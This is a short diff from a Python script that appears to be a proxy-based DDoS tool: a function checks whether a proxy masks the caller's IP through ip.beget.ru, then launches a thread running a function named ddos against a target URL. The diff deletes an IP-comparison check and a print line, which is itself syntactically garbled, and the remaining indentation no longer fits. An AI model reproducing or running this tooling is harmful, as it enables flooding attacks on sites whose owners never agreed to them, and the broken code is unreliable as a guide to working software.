@@ -49,8 +49,6 @@ def check(ip, prox, url):
 		ipx = r.get("http://ip.beget.ru/", proxies={'http': "http://{}".format(prox), 'https':"http://{}".format(prox)}).text
 	except:
 		ipx = ip
-	if ip != ipx:
-		print(\033[1;32m.133[0m"{} good! Starting...".format(prox)+Style.RESET_ALL)
 		thread_list = []
 		t = threading.Thread (target=ddos, args=(prox, url))
 		thread_list.append(t)
